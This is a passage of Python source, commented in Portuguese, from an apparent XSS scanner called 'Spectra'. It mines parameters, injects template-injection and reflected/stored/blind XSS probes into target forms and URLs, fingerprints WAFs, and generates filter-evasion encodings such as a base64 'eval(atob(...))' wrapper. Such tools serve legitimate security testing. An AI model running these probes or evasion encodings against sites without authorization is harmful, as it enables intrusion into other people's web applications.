                # Testa payloads selecionados
                for payload in selected_payloads[:5]:
                    test_data = {param: payload}
                    
                    try:
                        if method.lower() == 'get':
                            response = self.session.get(url, params=test_data, timeout=7, verify=True)
                        else:
                            post_payload = (form_data or {}).copy()
                            post_payload[param] = payload
                            response = self.session.post(url, data=post_payload, timeout=7, verify=True)
                        
                        self.stats['total_requests'] += 1
                        
                        # Verifica execução de template injection
                        if '49' in response.text and '7*7' in payload:  # 7*7 = 49
                            detail = f"Template Injection XSS no parâmetro '{param}' em {url}"
                            rec = f"Template injection confirmado: payload '{payload}' executou matemática (7*7=49)."
                            
                            if self.verbose:
                                print_warning(f"Template Injection detectado em [cyan]{param}[/cyan]: [yellow]{payload}[/yellow]")
                            
                            self._add_finding("Alto", "Template Injection XSS", detail, rec)
                            break
                        elif payload in response.text and 'script' in payload:
                            detail = f"Possível Template Injection XSS no parâmetro '{param}' em {url}"
                            rec = f"Payload '{payload}' foi refletido. Verificar execução manual."
                            
                            self._add_finding("Médio", "Template Injection XSS (Suspeito)", detail, rec)
                            
                    except requests.RequestException:
                        continue
                        
            except requests.RequestException:
                continue
        
        progress.remove_task(task_id)

    def _mine_parameters(self, response_text, base_url):
        """Extrai parâmetros potenciais do JavaScript e HTML."""
        if not self.parameter_mining:
            return []
            
        parameters = set()
        
        # Extrai parâmetros de JavaScript
        js_patterns = [
            r'[\'"]([\w\-]+)[\'"]:\s*[\'"]?[\w\-\.]+[\'"]?',  # objeto JS
            r'\.get\([\'"](\w+)[\'"]',  # .get('param')
            r'\.(\w+)\s*=',  # .param = 
            r'data-(\w+)',  # data-attributes
            r'name=[\'"](\w+)[\'"]',  # name attributes
            r'id=[\'"](\w+)[\'"]',  # id attributes
        ]
        
        for pattern in js_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            parameters.update(matches)
        
        # Extrai parâmetros de formulários ocultos
        soup = BeautifulSoup(response_text, 'html.parser')
        for input_elem in soup.find_all('input', {'type': 'hidden'}):
            if input_elem.get('name'):
                parameters.add(input_elem['name'])
        
        # Parâmetros comuns para teste
        common_params = [
            'q', 'search', 'query', 'keyword', 'term', 'find', 's',
            'page', 'id', 'user', 'username', 'name', 'email',
            'callback', 'redirect', 'url', 'link', 'src', 'file',
            'input', 'data', 'value', 'content', 'text', 'msg'
        ]
        
        parameters.update(common_params)
        return list(parameters)

    def _waf_fingerprint(self, response):
        """Detecta presença de WAF específico."""
        if not self.waf_fingerprint:
            return {'detected': False}
            
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
            'AWS WAF': ['x-amzn-requestid', 'x-amz-cf-id'],
            'ModSecurity': ['mod_security', 'modsecurity'],
            'Akamai': ['akamai', 'x-akamai'],
            'Incapsula': ['incap_ses', 'visid_incap'],
            'Sucuri': ['x-sucuri-id', 'sucuri'],
            'F5 BIG-IP': ['bigipserver', 'f5-bigip'],
            'Barracuda': ['barra', 'barracuda'],
            'Fortinet': ['fortigate', 'fortinet']
        }
        
        headers_str = str(response.headers).lower()
        content_str = response.text.lower()
        
        for waf_name, signatures in waf_signatures.items():
            for sig in signatures:
                if sig in headers_str or sig in content_str:
                    self.stats['waf_detected'] = True
                    return {
                        'detected': True,
                        'name': waf_name,
                        'confidence': 'High' if sig in headers_str else 'Medium'
                    }
        
        # Verifica padrões de bloqueio genéricos
        block_patterns = [
            r'blocked',
            r'forbidden',
            r'access denied',
            r'security violation',
            r'suspicious activity'
        ]
        
        for pattern in block_patterns:
            if re.search(pattern, content_str):
                self.stats['waf_detected'] = True
                return {
                    'detected': True,
                    'name': 'Generic WAF',
                    'confidence': 'Low'
                }
        
        return {'detected': False}

    def _apply_encoding_variations(self, payload):
        """Aplica diferentes variações de encoding ao payload."""
        if not self.encoding_variations:
            return [payload]
            
        variations = [payload]  # Original
        
        try:
            # URL encoding
            variations.append(urllib.parse.quote(payload))
            variations.append(urllib.parse.quote(payload, safe=''))
            
            # Double URL encoding
            variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # HTML entity encoding
            html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;')
            variations.append(html_encoded)
            
            # Unicode encoding
            unicode_encoded = payload.encode('unicode_escape').decode('ascii')
            variations.append(unicode_encoded)
            
            # Base64 (para alguns contextos)
            if 'javascript:' in payload:
                b64_payload = base64.b64encode(payload.encode()).decode()
                variations.append(f"javascript:eval(atob('{b64_payload}'))")
            
        except Exception as e:
            self.logger.debug(f"Erro ao aplicar encoding: {e}")
            
        return variations

    def run_scan(self, return_findings=False):
        """Executa o scan de XSS com todas as funcionalidades avançadas."""
        self.stats['scan_start_time'] = time.time()
        
        if not return_findings:
            # Display inicial seguindo padrão Spectra
            print_info("Scanner Avançado de XSS - Spectra")
            print_info(f"Alvo: [bold cyan]{self.base_url}[/bold cyan]")
            print_info(f"Funcionalidades: DOM {'[bold green]✓[/bold green]' if self.dom_verification else '[bold red]✗[/bold red]'} | Mining {'[bold green]✓[/bold green]' if self.parameter_mining else '[bold red]✗[/bold red]'} | WAF {'[bold green]✓[/bold green]' if self.waf_fingerprint else '[bold red]✗[/bold red]'} | Parallel {'[bold green]✓[/bold green]' if self.parallel_testing else '[bold red]✗[/bold red]'}")
            print_info(f"Testes: Reflected {'[bold green]✓[/bold green]'} | Stored {'[bold green]✓[/bold green]' if self.scan_stored else '[bold red]✗[/bold red]'} | DOM {'[bold green]✓[/bold green]' if self.fuzz_dom else '[bold red]✗[/bold red]'} | Headers {'[bold green]✓[/bold green]' if self.test_headers else '[bold red]✗[/bold red]'} | Upload {'[bold green]✓[/bold green]' if self.test_file_upload else '[bold red]✗[/bold red]'}")
            print_info(f"Avançado: Blind {'[bold green]✓[/bold green]' if self.blind_xss_callback else '[bold red]✗[/bold red]'} | WebSocket {'[bold green]✓[/bold green]'} | API/JSON {'[bold green]✓[/bold green]'} | Templates {'[bold green]✓[/bold green]'} | Cache {'[bold green]✓[/bold green]'}")
            console.print("-" * 60)
        
        try:
            # Primeira requisição para análise inicial
            response = self.session.get(self.base_url, timeout=10, verify=True)
            self._update_stats_thread_safe('total_requests', 1)
            
            # Análise inicial de WAF
            waf_info = self._waf_fingerprint(response)
            if waf_info['detected'] and not return_findings:
                print_warning(f"WAF Detectado: [bold cyan]{waf_info['name']}[/bold cyan] (Confiança: {waf_info['confidence']})")
            
            # Parse do HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Parameter Mining
            mined_params = self._mine_parameters(response.text, self.base_url) if self.parameter_mining else []
            
            # Coleta de pontos de entrada
            tasks = []
            
            # Log verbose para parâmetros minerados
            if self.verbose and mined_params:
                print_info(f"Parâmetros minerados: [cyan]{', '.join(mined_params[:5])}[/cyan]" + 
                          (f" (+{len(mined_params)-5} outros)" if len(mined_params) > 5 else ""))
            
            # Links com parâmetros
            links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
            for link in links:
                parsed = urlparse(link)
                base = urlunparse(parsed._replace(query=""))
                for param in parse_qs(parsed.query): 
                    tasks.append(('get', base, param, None))
            
            # Formulários
            forms = soup.find_all('form')
            for form in forms:
                action = urljoin(self.base_url, form.get('action', ''))
                method = form.get('method', 'post').lower()
                data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea'], {'name': True})}
                for param in data: 
                    tasks.append((method, action, param, data))
            
            # Adiciona parâmetros minerados como tarefas GET
            for param in mined_params:
                if not any(task[2] == param for task in tasks):
                    tasks.append(('get', self.base_url, param, None))
            
            # Log verbose para estatísticas de entrada
            if self.verbose:
                total_params = len(set(task[2] for task in tasks))
                total_forms = len(forms)
                print_info(f"Pontos de entrada: [cyan]{total_params}[/cyan] parâmetros, [cyan]{total_forms}[/cyan] formulários")
            
            if not tasks and not forms:
                if not return_findings: 
                    print_warning("Nenhum ponto de entrada encontrado para testar XSS.")
                return [] if return_findings else None
            
            # Execução dos scans com progress melhorado
            with create_progress() as progress:
                
                # 1. Scan de Headers XSS (se ativado)
                if self.test_headers:
                    if self.verbose:
                        print_info("Iniciando scan de XSS em Headers HTTP...")
                    self._scan_header_xss(self.base_url, progress)
                
                # 2. Scan de XSS Refletido (Paralelo ou Avançado)
                if tasks:
                    if self.verbose:
                        print_info(f"Iniciando scan de XSS Refletido para [cyan]{len(tasks)}[/cyan] parâmetros...")
                    if self.parallel_testing and len(tasks) >= 3:
                        self._scan_reflected_parallel(tasks, progress, waf_info)
                    else:
                        self._scan_reflected_advanced(tasks, progress, waf_info)
                
                # 3. Scan de Blind XSS (se callback URL configurado)
                if self.blind_xss_callback and tasks:
                    if self.verbose:
                        print_info("Iniciando scan de Blind XSS...")
                    self._scan_blind_xss(tasks, progress)
                
                # 4. Scan de DOM XSS (se ativado)
                if self.fuzz_dom and tasks:
                    if self.verbose:
                        print_info("Iniciando scan de DOM XSS com Selenium...")
                    self._scan_dom_xss(tasks, progress)
                
                # 5. Scan de File Upload XSS (se ativado)
                if self.test_file_upload and forms:
                    if self.verbose:
                        print_info("Iniciando scan de XSS via File Upload...")
                    self._scan_file_upload_xss(forms, progress)
                
                # 6. Scan de WebSocket XSS
                if self.verbose:
                    print_info("Iniciando scan de WebSocket XSS...")
                self._scan_websocket_xss(self.base_url, progress)
                
                # 7. Scan de API/JSON XSS
                if self.verbose:
                    print_info("Iniciando scan de API/JSON XSS...")
                self._scan_api_json_xss(self.base_url, progress)
                
                # 8. Scan de Template Injection XSS
                if tasks:
                    if self.verbose:
                        print_info("Iniciando scan de Template Injection XSS...")
                    self._scan_template_injection_xss(tasks, progress)
                
                # 9. Scan de XSS Armazenado (se ativado)  
                if self.scan_stored and forms:
                    post_forms = [form for form in forms if form.get('method', 'get').lower() == 'post']
                    if post_forms:
                        if self.verbose:
                            print_info(f"Iniciando scan de XSS Armazenado em [cyan]{len(post_forms)}[/cyan] formulários...")
                        self._inject_into_forms(post_forms, progress)
                        self._verify_storage(progress)
            
            # Cleanup Selenium
            self._cleanup_selenium()
            
            # Estatísticas finais
            scan_duration = time.time() - self.stats['scan_start_time']
            if not return_findings:
                self._display_final_stats(scan_duration)
            
            if return_findings: 
                return self.vulnerable_points
            
            self._present_findings_advanced()
            
        except KeyboardInterrupt:
            print_error("Scan interrompido pelo usuário.")
            self._cleanup_selenium()
        except Exception as e:
            self.logger.error(f"Erro durante o scan: {e}")
            self._cleanup_selenium()
            if not return_findings:
                print_error(f"Erro durante o scan: {e}")

    def _display_final_stats(self, scan_duration):
        """Exibe estatísticas finais do scan XSS seguindo padrão Spectra"""
        try:
            # Separator
            console.print("-" * 60)
            print_success("Scan de XSS concluído.")
            
            # Formatar duração
            minutes, seconds = divmod(scan_duration, 60)
            duration_str = f"{int(minutes):02d}:{int(seconds):02d}"
            
            # Estatísticas básicas
            print_info(f"Duração Total: [bold cyan]{duration_str}[/bold cyan]")
            print_info(f"URLs Testadas: [bold cyan]{self.stats.get('urls_tested', 0)}[/bold cyan]")
            print_info(f"Parâmetros Encontrados: [bold cyan]{self.stats.get('parameters_found', 0)}[/bold cyan]")
            print_info(f"Payloads Executados: [bold cyan]{self.stats.get('payloads_tested', 0)}[/bold cyan]")
            print_info(f"Vulnerabilidades: [bold red]{len(self.vulnerable_points)}[/bold red]")
            
            # Informações específicas se disponíveis
            if self.stats.get('forms_found', 0) > 0:
                print_info(f"Formulários: [bold cyan]{self.stats.get('forms_found', 0)}[/bold cyan]")
            
            if self.stats.get('waf_detected'):
                print_info(f"WAF Detectado: [bold yellow]Sim[/bold yellow]")
            else:
                print_info(f"WAF Detectado: [bold green]Não[/bold green]")
                
            if self.stats.get('dom_xss_scanned', 0) > 0:
                print_info(f"DOM XSS Testado: [bold green]Sim[/bold green]")
            
            # Resumo de vulnerabilidades por tipo
            if self.vulnerable_points:
                vuln_types = {}
                for vuln in self.vulnerable_points:
                    vuln_type = vuln.get('Tipo', 'Unknown')
                    vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
                
                console.print()
                print_warning("VULNERABILIDADES ENCONTRADAS:")
                for vuln_type, count in vuln_types.items():
                    console.print(f"   • {vuln_type}: [bold red]{count}[/bold red] ocorrência(s)")
            else:
                console.print()
                print_success("Nenhuma vulnerabilidade XSS detectada!")
            
            console.print("-" * 60)
            
        except Exception as e:
            # Fallback simples caso haja erro na formatação
            self.logger.debug(f"Erro na formatação de estatisticas: {e}")
            print_info(f"Scan concluído em {scan_duration:.2f}s")
            print_info(f"Vulnerabilidades encontradas: {len(self.vulnerable_points)}")
            print_info(f"URLs testadas: {self.stats.get('urls_tested', 0)}")
            print_info(f"Payloads testados: {self.stats.get('payloads_tested', 0)}")

    def _present_findings_advanced(self):
        """Apresenta os resultados seguindo padrão Spectra."""
        console.print("\n" + "="*80)
        console.print("[bold cyan]RESULTADOS DO SCAN XSS[/bold cyan]", justify="center")
        console.print("="*80)
        
        if not self.vulnerable_points:
            print_success("Nenhuma vulnerabilidade de XSS foi encontrada.")
            console.print("[dim]O target parece estar protegido contra XSS ou não possui pontos de entrada testáveis.[/dim]")
        else:
            # Agrupa vulnerabilidades por tipo
            vuln_by_type = {}
            for vuln in self.vulnerable_points:
                vuln_type = vuln['Tipo']
                if vuln_type not in vuln_by_type:
                    vuln_by_type[vuln_type] = []
                vuln_by_type[vuln_type].append(vuln)
            
            # Exibe sumário
            print_warning(f"{len(self.vulnerable_points)} vulnerabilidades encontradas")
            for vuln_type, vulns in vuln_by_type.items():
                risk_counts = {}
                for vuln in vulns:
                    risk = vuln['Risco']
                    risk_counts[risk] = risk_counts.get(risk, 0) + 1
                
                risk_summary = []
                for risk in ['Alto', 'Médio', 'Baixo']:
                    if risk in risk_counts:
                        color = 'red' if risk == 'Alto' else 'yellow' if risk == 'Médio' else 'blue'
                        risk_summary.append(f"[{color}]{risk}: {risk_counts[risk]}[/{color}]")
                
                console.print(f"[white]• {vuln_type}:[/white] {' | '.join(risk_summary)}")
            
            # Tabela detalhada
            table = Table(title="Detalhes das Vulnerabilidades", show_header=True, header_style="bold magenta")
            table.add_column("Risco", style="cyan", width=8)
            table.add_column("Tipo", style="yellow", width=15)
            table.add_column("Detalhe", style="white", width=40)
            table.add_column("Recomendação", style="dim white", width=50)
            
            # Ordena por risco e tipo
            risk_order = {"Alto": 0, "Médio": 1, "Baixo": 2}
            sorted_findings = sorted(
                self.vulnerable_points, 
                key=lambda x: (risk_order.get(x["Risco"], 99), x["Tipo"])
            )
            
            for vuln in sorted_findings:
                risk_style = "red" if vuln['Risco'] == 'Alto' else "yellow" if vuln['Risco'] == 'Médio' else "blue"
                table.add_row(
                    f"[{risk_style}]{vuln['Risco']}[/{risk_style}]",
                    vuln['Tipo'],
                    vuln['Detalhe'],
                    vuln['Recomendação']
                )
            
            console.print(table)
        
        console.print("="*80)

    def _update_progress_with_vulns(self, progress, task_id, param_name):
        """Atualiza a descrição da barra de progresso com o número de vulnerabilidades encontradas de forma discreta."""
        vuln_count = len(self.vulnerable_points)
        if vuln_count > 0:
            vuln_text = f"[green]Testando [cyan]{param_name}[/cyan] | [red]{vuln_count} vuln(s)[/red]"
        else:
            vuln_text = f"[green]Testando [cyan]{param_name}[/cyan]"
        
        progress.update(task_id, description=vuln_text)

def xss_scan(url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False, 
             enable_bypasses=True, context_analysis=True, validate_execution=True, 
             analyze_csp=True, verbose=False, return_findings=False,
             dom_verification=True, parameter_mining=True, waf_fingerprint=True,
             encoding_variations=True, headless_mode=True, blind_xss_callback=None,
             test_headers=True, test_file_upload=True, parallel_testing=True, 
             max_workers=5):
    """
    Executa scan avançado de XSS com novas funcionalidades implementadas.
    
    Args:
        url (str): URL alvo para o scan
        custom_payloads_file (str): Arquivo com payloads customizados
        scan_stored (bool): Ativar detecção de XSS armazenado
        fuzz_dom (bool): Ativar fuzzing de DOM XSS
        enable_bypasses (bool): Ativar técnicas de bypass
        context_analysis (bool): Ativar análise de contexto
        validate_execution (bool): Ativar validação de execução
        analyze_csp (bool): Ativar análise de CSP aprimorada
        verbose (bool): Modo verbose - exibe informações detalhadas durante o scan
        return_findings (bool): Se True, retorna lista de vulnerabilidades
        dom_verification (bool): Ativar verificação DOM com Selenium
        parameter_mining (bool): Ativar mineração de parâmetros
        waf_fingerprint (bool): Ativar detecção de WAF
        encoding_variations (bool): Ativar variações de encoding
        headless_mode (bool): Executar Selenium em modo headless
        blind_xss_callback (str): URL para receber callbacks de Blind XSS
        test_headers (bool): Ativar testes de XSS em headers HTTP
        test_file_upload (bool): Ativar testes de XSS via file upload
        parallel_testing (bool): Ativar processamento paralelo de parâmetros
        max_workers (int): Número máximo de threads paralelas (padrão: 5)
    
    Returns:
        list ou None: Lista de vulnerabilidades encontradas se return_findings=True
        
    Novas funcionalidades implementadas:
        - Blind XSS detection com callbacks externos
        - XSS testing em headers HTTP (User-Agent, Referer, etc.)
        - XSS via file upload (SVG, HTML, XML)
        - Análise CSP melhorada com técnicas de bypass
        - Processamento paralelo para melhor performance
        - Thread-safety para execução segura
    """
    scanner = XSSScanner(url, custom_payloads_file=custom_payloads_file, 
                        scan_stored=scan_stored, fuzz_dom=fuzz_dom,
                        blind_xss_callback=blind_xss_callback)
    
    # Configurações avançadas
    scanner.enable_bypasses = enable_bypasses
    scanner.context_analysis = context_analysis  
    scanner.validate_execution = validate_execution
    scanner.analyze_csp = analyze_csp
    scanner.verbose = verbose
    scanner.dom_verification = dom_verification
    scanner.parameter_mining = parameter_mining
    scanner.waf_fingerprint = waf_fingerprint
    scanner.encoding_variations = encoding_variations
    scanner.headless_mode = headless_mode
    scanner.test_headers = test_headers
    scanner.test_file_upload = test_file_upload
    scanner.parallel_testing = parallel_testing
    scanner.max_workers = max_workers
    
    return scanner.run_scan(return_findings=return_findings)
